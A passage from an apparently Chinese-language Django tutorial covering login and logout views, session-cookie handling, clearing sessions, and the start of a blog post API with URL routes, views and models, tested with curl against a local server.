    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^^^^ view function user_logout'</span>)
    <span style="color: #483d8b;">print</span>(request.user)
    <span style="color: #483d8b;">print</span>(request.user.<span style="color: #483d8b;">__dict__</span>)
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.session))
    <span style="color: #483d8b;">print</span>(*request.session.items(), sep=<span style="color: #8b2252;">'</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">'</span>)
    <span style="color: #a020f0;">if</span> request.user.is_authenticated:
        <span style="color: #a0522d;">s</span> = 200
    <span style="color: #a020f0;">else</span>:
        <span style="color: #a0522d;">s</span> = 400
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^'</span>*30)
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#30475;&#21040;&#20102;'</span>, status=s)
</pre>
</div>

<p>
测试
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20808;&#30331;&#24405;&#33719;&#21462; session cookie</span>
curl --location <span style="color: #8b2252;">'127.0.0.1:8000/users/login'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=3lr4u1obzuri6r4xf8i1jlz1jiguvqcy'</span> <span style="color: #8b2252;">\</span>
--data-raw <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "username":"abc",</span>
<span style="color: #8b2252;">    "password":"abc",</span>
<span style="color: #8b2252;">    "email":"abc@abc.com"</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">'</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#20195;&#30721;&#36755;&#20986;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20877;&#30331;&#24405;</span>
curl --location <span style="color: #8b2252;">'127.0.0.1:8000/users/logout'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=3lr4u1obzuri6r4xf8i1jlz1jiguvqcy'</span> <span style="color: #8b2252;">\</span>
--data-raw <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "username":"abc",</span>
<span style="color: #8b2252;">    "password":"abc",</span>
<span style="color: #8b2252;">    "email":"abc@abc.com"</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">'</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#20195;&#30721;&#36755;&#20986;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0acaeb1e-ba69-4953-82ff-9e5d9e5f9401" class="outline-3">
<h3 id="h:0acaeb1e-ba69-4953-82ff-9e5d9e5f9401">登出代码</h3>
<div class="outline-text-3" id="text-h:0acaeb1e-ba69-4953-82ff-9e5d9e5f9401">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/urls.py</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg, user_login, user_logout

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, reg), <span style="color: #b22222;"># </span><span style="color: #b22222;">reg POST /users/</span>
    path(<span style="color: #8b2252;">'login'</span>, user_login), <span style="color: #b22222;"># </span><span style="color: #b22222;">Post /users/login</span>
    pasth(<span style="color: #8b2252;">'logout'</span>, user_logout), <span style="color: #b22222;"># </span><span style="color: #b22222;">Post /users/logout</span>
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout

<span style="color: #228b22;">@login_required</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^^^^ view function user_logout'</span>)
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.session))
    <span style="color: #483d8b;">print</span>(*request.session.items(), sep=<span style="color: #8b2252;">'</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">'</span>)

    logout(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">request.session, request.user &#28165;&#31354;&#24403;&#21069;&#29992;&#25143;&#30331;&#24405;&#29366;&#24577;&#65292;&#21253;&#25324;session&#21644;&#25968;&#25454;&#24211;django_session&#35760;&#24405;</span>
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^'</span>*30)
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#30331;&#20986;&#25104;&#21151;'</span>, status=200)
</pre>
</div>

<p>
完整user/views.py代码
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_GET, require_POST, require_http_methods
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.contrib.auth.decorators import login_required  #&#20889;&#30340;&#38750;&#24120;&#22909;</span>
<span style="color: #a020f0;">from</span> functools <span style="color: #a020f0;">import</span> wraps
<span style="color: #a020f0;">from</span> django.contrib.sessions.backends.db <span style="color: #a020f0;">import</span> SessionStore
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user <span style="color: #a020f0;">and</span> user.is_active: <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;&#23494;&#30721;&#27491;&#30830;</span>
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#26377;&#24517;&#35201;&#65292;&#21487;&#20197;&#20351;&#29992;session&#20445;&#23384;&#19968;&#20123;&#20449;&#24687;</span>
            <span style="color: #a0522d;">session</span>:<span style="color: #228b22;">SessionStore</span> = request.session
            <span style="color: #b22222;"># </span><span style="color: #b22222;">session.set_expiry(60*60*24) # &#35774;&#32622;&#36807;&#26399;&#26102;&#38388;&#65292;&#21333;&#20301;&#31186;</span>
            <span style="color: #a0522d;">session</span>[<span style="color: #8b2252;">'user_info'</span>] = {
                <span style="color: #8b2252;">'id'</span>: request.user.<span style="color: #483d8b;">id</span>,
                <span style="color: #8b2252;">'username'</span>:request.user.username
            }
            <span style="color: #a020f0;">return</span> JsonResponse({}) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#20102;login&#20989;&#25968;&#65292;&#36820;&#22238;&#26102;&#23601;&#24102;&#30528;set-cookie&#65292;&#35774;&#32622;sessionid</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">login_required</span>(viewfunc):
    <span style="color: #228b22;">@wraps</span>(viewfunc)
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request, *args, **kwars):
        <span style="color: #a020f0;">if</span> request.user.is_authenticated:
            <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
        <span style="color: #a020f0;">return</span> HttpResponse(status=401)
    <span style="color: #a020f0;">return</span> wrapper

<span style="color: #228b22;">@login_required</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
    logout(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">request.session, request.user &#28165;&#31354;&#24403;&#21069;&#29992;&#25143;&#30331;&#24405;&#29366;&#24577;&#65292;&#21253;&#25324;session&#21644;&#25968;&#25454;&#24211;django_session&#35760;&#24405;</span>
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#30331;&#20986;&#25104;&#21151;'</span>, status=200)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a41882ae-8e1b-49a9-bc6b-dc1a42cb8a06" class="outline-3">
<h3 id="h:a41882ae-8e1b-49a9-bc6b-dc1a42cb8a06">Session使用</h3>
<div class="outline-text-3" id="text-h:a41882ae-8e1b-49a9-bc6b-dc1a42cb8a06">
</div>
<div id="outline-container-h:1b51cfd9-d386-40d1-bf4e-d39052400add" class="outline-4">
<h4 id="h:1b51cfd9-d386-40d1-bf4e-d39052400add">Session-Cookie机制</h4>
<div class="outline-text-4" id="text-h:1b51cfd9-d386-40d1-bf4e-d39052400add">
<p>
网景公司发明了Cookie技术，为了解决浏览器端数据存储问题。
</p>
<ul class="org-ul">
<li>每一次request请求时，会把此域名相关的Cookie发往服务器端。服务器端也可以使用response中的set-cookie来设置cookie值。</li>
</ul>

<p>
动态网页技术，也需要知道用户身份，但是HTTP是无状态协议，无法知道。必须提出一种技术，让客户端提交的信息可以表明身份，而且不能更改。这就是Session技术。
</p>

<p>
Session开启后，会为浏览器端设置一个Coolie值，即SessionID.
</p>

<p>
这个放置SessionID的Cookie是会话级的，浏览器不做持久化存储只放在内存中，并且浏览器关闭自动清除。
</p>

<p>
浏览器端发起一个HTTP请求后，这个SessionID会通过Cookie发到服务器端，服务端就可以通过这个ID查到对应的一个字典结构。如果查无此ID,就为此浏览器重新生成一个SessionID,为它建立一个SessionID和空字典的映射关系。
</p>

<p>
可以在这个ID对应的Session字典中，存入键值对来保持与当前会话相关的信息。
</p>
<ol class="org-ol">
<li>Session会定期过期清除</li>
<li>Session占用服务端内存</li>
<li>Session如果没有持久化，如果服务程序崩溃，那么所有Session信息丢失</li>
<li>Session可以持久化到数据库中，如果服务程序崩溃，那么可以从数据库中恢复</li>
</ol>
</div>
</div>
<div id="outline-container-h:00125130-88c9-489a-b030-378e2cc122a7" class="outline-4">
<h4 id="h:00125130-88c9-489a-b030-378e2cc122a7">开启session支持</h4>
<div class="outline-text-4" id="text-h:00125130-88c9-489a-b030-378e2cc122a7">
<p>
Django可以使用Session
</p>
<ol class="org-ol">
<li>在settings中，MIDDLEWARE设置中，启用'django.contrib.sessions.middleware.SessionMiddleware'。</li>
<li>在INSTALLED_APPS设置中，启用'django.contrib.sessions'。它是基于数据库存储的Session。</li>
<li>Session不使用，可以关闭上述配置，以减少开销</li>
<li>在数据库的表中的django_session表，记录session信息。但可以使用文件系统或<a href="https://docs.djangoproject.com/zh-hans/5.2/topics/http/sessions/#using-cached-sessions">其他cache来存储</a></li>
</ol>
</div>
</div>
<div id="outline-container-h:dd447754-0122-457d-8fc8-91db2af548ae" class="outline-4">
<h4 id="h:dd447754-0122-457d-8fc8-91db2af548ae">session清除</h4>
<div class="outline-text-4" id="text-h:dd447754-0122-457d-8fc8-91db2af548ae">
<p>
登录成功，为当前session在django_session表中增加一条记录，如果没有显式调用logout函数或request.session.flush()，那么该记录不会消失。Django也没有自动清除失效记录的功能。
</p>

<p>
request.session.flush()会清除当前session，同时删除表记录。
</p>

<p>
但Django提供了一个命令clearsessions,建议放在cron中定期执行厅。
</p>
<div class="org-src-container">
<pre class="src src-sh">django-admin.py clearsessions
manage.py clearsessions
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:ecb5af9a-c858-4c89-9011-a08b2b0c923c" class="outline-2">
<h2 id="h:ecb5af9a-c858-4c89-9011-a08b2b0c923c">博文接口实现</h2>
<div class="outline-text-2" id="text-h:ecb5af9a-c858-4c89-9011-a08b2b0c923c">
</div>
<div id="outline-container-h:02c5eb62-e4e4-4b2b-9843-2473b0a242de" class="outline-3">
<h3 id="h:02c5eb62-e4e4-4b2b-9843-2473b0a242de">功能分析</h3>
<div class="outline-text-3" id="text-h:02c5eb62-e4e4-4b2b-9843-2473b0a242de">
<div class="org-src-container">
<pre class="src src-txt">POST /posts/ 文章发布，试图类PostView

请求体 application/json
{
    "title":"string",
    "content":"string"
}

响应
201 发布成功
400 请求数据错误
</pre>
</div>

<div class="org-src-container">
<pre class="src src-txt">GET /posts/(\d+) 查看指定文章，试图函数getpost

响应
200 成功返回文章内容
404 文章不存在
</pre>
</div>

<div class="org-src-container">
<pre class="src src-txt">GET /posts/ 文章列表页，视图类PostView

响应
200 成功返回文章列表
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1a04237e-d588-442d-bdb4-746f7aa8d905" class="outline-3">
<h3 id="h:1a04237e-d588-442d-bdb4-746f7aa8d905">创建博文应用</h3>
<div class="outline-text-3" id="text-h:1a04237e-d588-442d-bdb4-746f7aa8d905">
<div class="org-src-container">
<pre class="src src-sh">python manage.py startapp post
</pre>
</div>

<p>
注意： <b>一定要把应用post加入到settings.py中</b> ，否则不能迁移
</p>

<div class="org-src-container">
<pre class="src src-py"># blog/settings.py中修改
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'user',
    "post",
]
</pre>
</div>
</div>
</div>
<div id="outline-container-h:39c7e318-5b6b-4ad2-bee1-9ffb8a739d6c" class="outline-3">
<h3 id="h:39c7e318-5b6b-4ad2-bee1-9ffb8a739d6c">路由</h3>
<div class="outline-text-3" id="text-h:39c7e318-5b6b-4ad2-bee1-9ffb8a739d6c">
<p>
1.修改blog/urls.py文件
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;blog/urls.py&#25991;&#20214;</span>
<span style="color: #8b2252;">"""</span>
<span style="color: #8b2252;">URL configuration for blog project.</span>

<span style="color: #8b2252;">The `urlpatterns` list routes URLs to views. For more information please see:</span>
<span style="color: #8b2252;">    https://docs.djangoproject.com/en/5.2/topics/http/urls/</span>
<span style="color: #8b2252;">Examples:</span>
<span style="color: #8b2252;">Function views</span>
<span style="color: #8b2252;">    1. Add an import:  from my_app import views</span>
<span style="color: #8b2252;">    2. Add a URL to urlpatterns:  path('', views.home, name='home')</span>
<span style="color: #8b2252;">Class-based views</span>
<span style="color: #8b2252;">    1. Add an import:  from other_app.views import Home</span>
<span style="color: #8b2252;">    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')</span>
<span style="color: #8b2252;">Including another URLconf</span>
<span style="color: #8b2252;">    1. Import the include() function: from django.urls import include, path</span>
<span style="color: #8b2252;">    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))</span>
<span style="color: #8b2252;">"""</span>
<span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, include
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.template.loader <span style="color: #a020f0;">import</span> get_template
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> datetime <span style="color: #a020f0;">import</span> datetime

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):

    <span style="color: #a0522d;">context</span> = {
        <span style="color: #8b2252;">'a'</span>:100,
        <span style="color: #8b2252;">'b'</span>:0,
        <span style="color: #8b2252;">'c'</span>:<span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">range</span>(10,20)),
        <span style="color: #8b2252;">'d'</span>:<span style="color: #483d8b;">dict</span>(<span style="color: #483d8b;">zip</span>(<span style="color: #8b2252;">'abcde'</span>,<span style="color: #8b2252;">'ABCDE'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">d.e &#27809;&#25214;&#21040; d['e'] &#27809;&#25214;&#21040; d[e]</span>
        <span style="color: #8b2252;">'s'</span>:<span style="color: #8b2252;">'abcde'</span>,
        <span style="color: #8b2252;">'date'</span>:datetime.now(),
    }
    <span style="color: #b22222;"># </span><span style="color: #b22222;">with open(r'D:\project\pyprojs\trae\blog10\user\index.html', encoding='utf-8') as f:</span>
    <span style="color: #b22222;">#     </span><span style="color: #b22222;">txt = f.read()</span>
    <span style="color: #b22222;">#     </span><span style="color: #b22222;">txt = txt.format(content)</span>
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'index.html'</span>, {<span style="color: #8b2252;">'mydict'</span>:context}, status=201)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test</span>(request, clz, uid):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print(request.path)</span>
    <span style="color: #483d8b;">print</span>(clz, uid, <span style="color: #483d8b;">type</span>(clz), <span style="color: #483d8b;">type</span>(uid))
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'abc~~~~'</span>)

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls),
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/' =&gt; index&#20989;&#25968;</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
    path(<span style="color: #8b2252;">'test/&lt;clz&gt;/&lt;int:uid&gt;'</span>, test), <span style="color: #b22222;"># </span><span style="color: #b22222;">/test/tom/2 &#23454;&#21442;&#27880;&#20837;</span>
    path(<span style="color: #8b2252;">'users/'</span>, include(<span style="color: #8b2252;">'user.urls'</span>)),  <span style="color: #b22222;"># </span><span style="color: #b22222;">/users</span>
    path(<span style="color: #8b2252;">'posts/'</span>, include(<span style="color: #8b2252;">'post.urls'</span>)),  <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts</span>
]
</pre>
</div>

<p>
2.新建post/urls.py文件
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> PostView, getpost

<span style="color: #b22222;">#</span><span style="color: #b22222;">path('path', &#20989;&#25968;&#25110;&#19977;&#20803;&#32452;)</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">as_view&#24403;&#20570;&#35270;&#22270;&#20989;&#25968;&#65292;&#22312;&#20869;&#37096;&#19968;&#23450;&#35201; &#26681;&#25454;method&#21028;&#26029;&#25214;&#21040;&#23545;&#21516;&#21517;&#22788;&#29702;&#26041;&#27861;</span>
<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, PostView.as_view()), <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts/ POST GET &#21338;&#25991;&#30340;&#22686;&#21152;&#12289;&#26597;&#35810;</span>
    path(<span style="color: #8b2252;">'&lt;int:id&gt;'</span>, getpost), <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts/123</span>
]
</pre>
</div>


<p>
3.修改post/views.py文件
</p>

<div class="org-src-container">
<pre class="src src-python"> <span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse,  HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View


<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889;</span>
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'method'</span>:<span style="color: #8b2252;">'get'</span>})
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;post&#20989;&#25968;&#65292;POST&#35831;&#27714;&#26080;&#27861;&#23545;&#24212;&#65292;&#36820;&#22238;405</span>
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'method'</span>:<span style="color: #8b2252;">'post'</span>})

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getpost</span>(request:HttpRequest, <span style="color: #483d8b;">id</span>:<span style="color: #483d8b;">int</span>):
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(<span style="color: #483d8b;">id</span>), <span style="color: #483d8b;">id</span>)
    <span style="color: #a020f0;">return</span> JsonResponse({})
</pre>
</div>

<p>
测试
</p>
<div class="org-src-container">
<pre class="src src-sh">curl --location --request POST <span style="color: #8b2252;">'127.0.0.1:8000/posts/'</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36820;&#22238;</span>
{<span style="color: #8b2252;">"method"</span>: <span style="color: #8b2252;">"post"</span>}

curl --location <span style="color: #8b2252;">'127.0.0.1:8000/posts/'</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36820;&#22238;</span>
{<span style="color: #8b2252;">"method"</span>: <span style="color: #8b2252;">"get"</span>}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1ed6dcb8-662d-4d91-844f-ebf58f5b180d" class="outline-3">
<h3 id="h:1ed6dcb8-662d-4d91-844f-ebf58f5b180d">模型</h3>
<div class="outline-text-3" id="text-h:1ed6dcb8-662d-4d91-844f-ebf58f5b180d">
<p>
1.修改post/models.py文件
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.db <span style="color: #a020f0;">import</span> models
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Post</span>(models.Model): <span style="color: #b22222;">#</span><span style="color: #b22222;">id, title, postdata, author</span>
    <span style="color: #a020f0;">class</span> <span style="color: #228b22;">Meta</span>:
        <span style="color: #a0522d;">db_table</span> = <span style="color: #8b2252;">'post'</span>
    <span style="color: #483d8b;">id</span> = models.BigAutoField(primary_key=<span style="color: #008b8b;">True</span>)
    <span style="color: #a0522d;">title</span> = models.CharField(max_length=256, null=<span style="color: #008b8b;">False</span>, unique=<span style="color: #008b8b;">False</span>)
    <span style="color: #a0522d;">postdate</span> = models.DateTimeField(null=<span style="color: #008b8b;">False</span>)
    <span style="color: #a0522d;">author</span> = models.ForeignKey(User, on_delete=models.PROTECT, ) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20851;&#32852;&#30340;&#23646;&#24615;author, &#23383;&#27573;&#21517;author_id</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">self.content &#21487;&#20197;&#35775;&#38382;Content&#23454;&#20363;&#65292;&#20854;&#20869;&#23481;&#26159;self.content.content</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__repr__</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"&lt;Post: {} {} {}&gt;"</span>.<span style="color: #483d8b;">format</span>(<span style="color: #a020f0;">self</span>.<span style="color: #483d8b;">id</span>, <span style="color: #a020f0;">self</span>.title, <span style="color: #a020f0;">self</span>.postdate)

    <span style="color: #a0522d;">__str__</span> = __repr__

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Content</span>(models.Model): <span style="color: #b22222;"># </span><span style="color: #b22222;">id &#20027;&#38190; &#22806;&#38190;, content</span>
    <span style="color: #a020f0;">class</span> <span style="color: #228b22;">Meta</span>:
        <span style="color: #a0522d;">db_table</span> = <span style="color: #8b2252;">'content'</span>

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#23545;&#19968;&#65292;&#36825;&#36793;&#20250;&#26377;&#19968;&#20010;&#22806;&#38190;post_id&#24341;&#29992;post.id</span>
    <span style="color: #a0522d;">post</span> = models.OneToOneField(Post, on_delete=models.PROTECT, primary_key=<span style="color: #008b8b;">True</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">post_id</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23383;&#27573;&#21517;&#20026; post_id &#19988;&#26159;&#20027;&#38190;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;&#20027;&#38190;&#65292;&#20250;&#33258;&#21160;&#21019;&#24314;&#19968;&#20010;&#22788;&#22659;id&#20027;&#38190;&#65292;&#22914;&#26524;&#21152;&#19978;db_column='id', &#36801;&#31227;&#29983;&#25104;&#30340;&#23383;&#27573;&#23601;&#26159;id&#20102;</span>
    <span style="color: #a0522d;">content</span> = models.TextField(null=<span style="color: #008b8b;">True</span>)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__repr__</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"&lt;Content: {} {}&gt;"</span>.<span style="color: #483d8b;">format</span>(<span style="color: #a020f0;">self</span>.pk, <span style="color: #a020f0;">self</span>.content[:20])

    <span style="color: #a0522d;">__str__</span> = __repr__
</pre>
</div>


<p>
on_delete
</p>
<ol class="org-ol">
<li>models.CASCADE: 级联删除。Django在DELETE级联上模拟SOL约束的行为，并删除包含外键的对象。</li>
<li>models.PROTECT: 通过引发ProtectedError (django.db.IntegrityError的子类)防止删除引用的对象。</li>
<li>models.SET_NULL: 设置外键为空;这只有在null为真时才有可能。</li>
